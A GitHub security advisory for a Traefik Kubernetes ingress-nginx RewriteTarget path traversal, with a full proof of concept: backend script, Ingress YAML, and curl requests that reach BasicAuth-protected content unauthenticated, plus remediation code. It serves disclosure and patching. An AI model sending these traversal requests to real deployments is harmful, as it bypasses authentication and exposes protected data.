# [H] Traefik: Kubernetes Ingress NGINX RewriteTarget Path Traversal Allows Route-Level Authentication Bypass

## Summary
Severity: High
Advisory: GHSA-8rxv-jg7p-wvg3
CVE: CVE-2026-67309
CWE: CWE-22, CWE-288
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-08-06
Source: https://github.com/advisories/GHSA-8rxv-jg7p-wvg3
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0 <3.7.8

## Details
## Summary

There is a high severity vulnerability in Traefik's Kubernetes Ingress NGINX provider. When an Ingress uses the `nginx.ingress.kubernetes.io/rewrite-target` annotation with a regular expression that captures attacker-controlled text without requiring a path separator (for example path `/api(.*)` with rewrite target `/$1`), the generated `RewriteTarget` middleware can turn an initially safe request path into a dot-segment traversal path after the router has already been selected.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.7.8

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

## Summary

Traefik's Kubernetes Ingress NGINX provider creates an internal `RewriteTarget` middleware for the `nginx.ingress.kubernetes.io/rewrite-target` annotation. When an Ingress path captures attacker-controlled text without requiring a path separator, the middleware can turn an initially safe path into a dot-segment traversal path after Traefik has already selected the router.

For example, with Ingress path `/api(.*)` and rewrite target `/$1`, an unauthenticated request to `/api../admin` follows this flow:

1. The default entry-point path sanitizer leaves `/api../admin` unchanged because `api..` is one ordinary segment.
2. The public router's `PathRegexp("(?i)^/api(.*)")` rule matches.
3. `RewriteTarget` captures `../admin` and creates `/../admin`.
4. The middleware forwards `/../admin` without checking whether path normalization changes it.
5. A backend that normalizes paths resolves `/../admin` to `/admin`.
6. The request reaches content intended to be reachable only through a separate `/admin` router with BasicAuth, DigestAuth, or ForwardAuth.

This is an unpatched sibling of [GHSA-cxjq-mrr5-89rv](https://github.com/traefik/traefik/security/advisories/GHSA-cxjq-mrr5-89rv), which added post-replacement normalization validation to `ReplacePathRegex`. The separate ingress-nginx `RewriteTarget` implementation did not receive the same validation. The bypass remains exploitable in the patched Traefik v3.7.7 release.

## Severity

**Proposed severity:** Critical

**CVSS 3.1:** 9.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

- Attack vector: Network
- Attack complexity: Low once the affected routing pattern exists
- Privileges required: None
- User interaction: None
- Scope: Unchanged
- Confidentiality: High
- Integrity: High
- Availability: None

**Primary weakness:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

**Secondary weakness:** CWE-288 — Authentication Bypass Using an Alternate Path or Channel

The practical impact depends on the protected backend paths. If they are read-only or low sensitivity, environmental severity may be lower.

### Exploitation Preconditions

- The Kubernetes Ingress NGINX provider is enabled.
- A public Ingress uses `rewrite-target` with a regex that can capture `..` adjacent to the matched prefix, such as `/api(.*)` with `/$1`.
- A protected router exposes another path on the same backend, such as `/admin`, and relies on a Traefik authentication or authorization middleware.
- The backend normalizes dot segments before dispatching the request.

These are deployment prerequisites; the remote attacker needs no credentials or special timing.

## Affected Components

### Confirmed versions

- Traefik v3.7.0 through v3.7.7
- Current `master` at commit `b93f02cd07b79490fb8c8f02e301a7a1ec553195`
- Current `v3.7` branch at `69259c3acc9d4bdc065cb2e3b83336f7de3e7038`

The vulnerable middleware is present in every stable v3.7 release checked. The v2.11 and v3.6 branches do not contain this ingress-nginx `RewriteTarget` implementation.

### Code locations

- `pkg/provider/kubernetes/ingress-nginx/middleware.go:257-274`
  - Converts the Ingress path and `rewrite-target` annotation directly into `dynamic.RewriteTarget` configuration.
- `pkg/middlewares/ingressnginx/rewritetarget/rewrite_target.go:85-157`
  - Performs capture-based path rewriting and forwards the rewritten path without normalization validation.
- `pkg/server/middleware/middlewares.go:346-353`
  - Instantiates the vulnerable middleware in the live HTTP chain.

## Root Cause

The provider passes the route regex and annotation replacement into the middleware:

```go
loc.RewriteTarget = &dynamic.RewriteTarget{
    Regex:       loc.Path,
    Replacement: rewrite,
}
```

`RewriteTarget.ServeHTTP` then derives a path from attacker-controlled capture groups:

```go
newTarget = rt.regexp.ReplaceAllString(currentPath, rt.replacement)

req.URL.RawPath = newTarget
req.URL.Path, err = url.PathUnescape(req.URL.RawPath)
req.RequestURI = req.URL.RequestURI()

rt.next.ServeHTTP(rw, req)
```

There is no invariant check between `PathUnescape` and forwarding to ensure that `req.URL.Path` equals its normalized form. Because routing happens before middlewares execute, any protected router that would match the normalized result is never reconsidered.

The core `ReplacePathRegex` middleware now enforces this invariant by calling `req.URL.JoinPath()` and returning HTTP 400 when normalization changes the replacement. `RewriteTarget` implements equivalent capture-based behavior but lacks that check.

Default `entryPoints.<name>.http.sanitizePath=true` does not prevent this issue. Sanitization occurs before routing and before `RewriteTarget` creates the traversal sequence.

## Impact

An unauthenticated network attacker can bypass route-level authentication or authorization and access protected paths on the backend. Depending on the protected API, this can allow:

- reading administrative or sensitive data;
- invoking privileged state-changing endpoints with GET, POST, PUT, PATCH, or DELETE;
- bypassing BasicAuth, DigestAuth, ForwardAuth, IP restrictions, or other controls attached only to the protected router;
- crossing intended public/protected path boundaries with one HTTP request.

The middleware is method-agnostic, so the issue is not limited to read-only requests.

## Proof of Concept

### Validation Environment

- Traefik v3.7.7 official Linux amd64 release
- Release archive SHA-256 verified as `5c8ff19144683f862c04e8ac01893e8cd94a3519d3d9ca3e6fbd0a7de73261ba`
- Default `sanitizePath=true`
- Node.js v24 backend
- Kubernetes Ingress NGINX provider fed valid Ingress, Service, EndpointSlice, and Secret objects through a local Kubernetes API fixture

No Traefik source files were modified.

### 1. Create the normalizing backend

Save as `backend.js`:

```javascript
const http = require("http");
const path = require("path");

http.createServer((req, res) => {
  const rawPath = req.url.split("?", 1)[0];
  const normalizedPath = path.posix.normalize(rawPath);
  const protectedPath = normalizedPath === "/admin" || normalizedPath.startsWith("/admin/");

  const body = JSON.stringify({
    rawPath,
    normalizedPath,
    result: protectedPath ? "ADMIN_SECRET_DATA" : "PUBLIC",
  });

  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(body);
}).listen(19090, "127.0.0.1");
```

Run it:

```bash
node backend.js
```

### 2. Apply the Kubernetes objects

The `ExternalName` service makes an externally run Traefik process connect to the local backend. If Traefik runs inside the cluster, replace it with a normal Deployment and ClusterIP Service.

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: basic-auth
  namespace: default
type: Opaque
stringData:
  auth: |
    admin:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/
---
apiVersion: v1
kind: Service
metadata:
  name: backend
  namespace: default
spec:
  type: ExternalName
  externalName: localhost
  ports:
    - name: http
      port: 19090
      targetPort: 19090
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: public-api
  namespace: default
  annotations:
    kubernetes.io/ingress.class: nginx
    nginx.ingress.kubernetes.io/use-regex: "true"
    nginx.ingress.kubernetes.io/rewrite-target: "/$1"
spec:
  rules:
    - http:
        paths:
          - path: /api(.*)
            pathType: ImplementationSpecific
            backend:
              service:
                name: backend
                port:
                  number: 19090
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: protected-admin
  namespace: default
  annotations:
    kubernetes.io/ingress.class: nginx
    nginx.ingress.kubernetes.io/auth-type: basic
    nginx.ingress.kubernetes.io/auth-secret: basic-auth
    nginx.ingress.kubernetes.io/auth-realm: Authentication Required
spec:
  rules:
    - http:
        paths:
          - path: /admin
            pathType: Prefix
            backend:
              service:
                name: backend
                port:
                  number: 19090
```

```bash
kubectl apply -f poc.yaml
```

### 3. Run unmodified Traefik v3.7.7

```bash
KUBECONFIG="$HOME/.kube/config" ./traefik \
  --entryPoints.web.address=127.0.0.1:18080 \
  --providers.kubernetesIngressNginx.watchNamespace=default \
  --providers.kubernetesIngressNginx.httpEntryPoint=web \
  --global.checkNewVersion=false \
  --log.level=DEBUG
```

Traefik generates the following relevant dynamic configuration:

```json
{
  "rule": "PathRegexp(\"(?i)^/api(.*)\")",
  "middlewares": ["...-rewrite-target"],
  "rewriteTarget": {
    "regex": "/api(.*)",
    "replacement": "/$1"
  }
}
```

The protected router separately contains a BasicAuth middleware and a `PathRegexp("(?i)^/admin")` rule.

### 4. Confirm authentication is enforced

```bash
curl --path-as-is -i http://127.0.0.1:18080/admin
```

Observed:

```text
HTTP/1.1 401 Unauthorized
```

### 5. Exploit the traversal rewrite

Plain variant:

```bash
curl --path-as-is -i http://127.0.0.1:18080/api../admin
```

Observed:

```text
HTTP/1.1 200 OK
{"rawPath":"/../admin","normalizedPath":"/admin","result":"ADMIN_SECRET_DATA"}
```

Percent-encoded variant:

```bash
curl --path-as-is -i http://127.0.0.1:18080/api%2e%2e/admin
```

Observed:

```text
HTTP/1.1 200 OK
{"rawPath":"/../admin","normalizedPath":"/admin","result":"ADMIN_SECRET_DATA"}
```

The direct request receives 401, while both unauthenticated traversal requests receive the protected content with status 200.

## Remediation

Apply the same post-rewrite normalization invariant used by the patched `ReplacePathRegex` middleware. After decoding `RawPath`, normalize a copy and reject the request if normalization changes `Path`:

```go
path := req.URL.Path
if path != "" {
    req.URL = req.URL.JoinPath()
}

if path != req.URL.Path {
    logger.Debug().Msgf(
        "Rejecting request, normalized path %q differs from rewritten path %q",
        req.URL.Path,
        path,
    )
    http.Error(rw, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
    return
}

req.RequestURI = req.URL.RequestURI()
```

Recommended additional actions:

1. Centralize the post-transformation path validation used by `ReplacePathRegex`, `StripPrefix`, `StripPrefixRegex`, and ingress-nginx `RewriteTarget` to prevent future drift.
2. Add regression tests for `/api../admin` and `/api%2e%2e/admin`, expecting HTTP 400.
3. Test both `URL.Path` and `URL.RawPath` cases and preserve legitimate encoded-path behavior.
4. Audit the ingress-nginx snippet `rewrite` implementation for the same post-rewrite invariant.

### Temporary Mitigation

Use a regex that requires a separator or end-of-path before captured user data, for example:

```yaml
nginx.ingress.kubernetes.io/use-regex: "true"
nginx.ingress.kubernetes.io/rewrite-target: "/$2"

# Ingress path:
path: /api(/|$)(.*)
```

This prevents `/api../admin` from matching. Also enforce authentication in the backend rather than relying exclusively on separate Traefik path routers. Entry-point `sanitizePath=true` alone is not a mitigation because the dangerous dot segment is created after sanitization.

## Duplicate Check

As of 2026-07-09:

- Traefik's public security advisories contain no entry mentioning `RewriteTarget` or ingress-nginx `rewrite-target` path traversal.
- Public issue and pull-request searches found no report for this path-normalization bypass.
- GHSA-cxjq-mrr5-89rv is related but not a duplicate: it fixes `pkg/middlewares/replacepathregex`, while this report affects `pkg/middlewares/ingressnginx/rewritetarget` and reproduces on the version that contains that fix, v3.7.7.

## Disclosure

If confirmed, could you please create a GitHub Security Advisory and request a CVE? I am happy to validate a patch and coordinate disclosure.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-8rxv-jg7p-wvg3
- https://nvd.nist.gov/vuln/detail/CVE-2026-67309
- https://github.com/traefik/traefik/commit/759515bec1b9f628b21ea8968ef63da853be5e29
- https://github.com/traefik/traefik
- https://www.vulncheck.com/advisories/traefik-path-traversal-via-rewritetarget-authentication-bypass
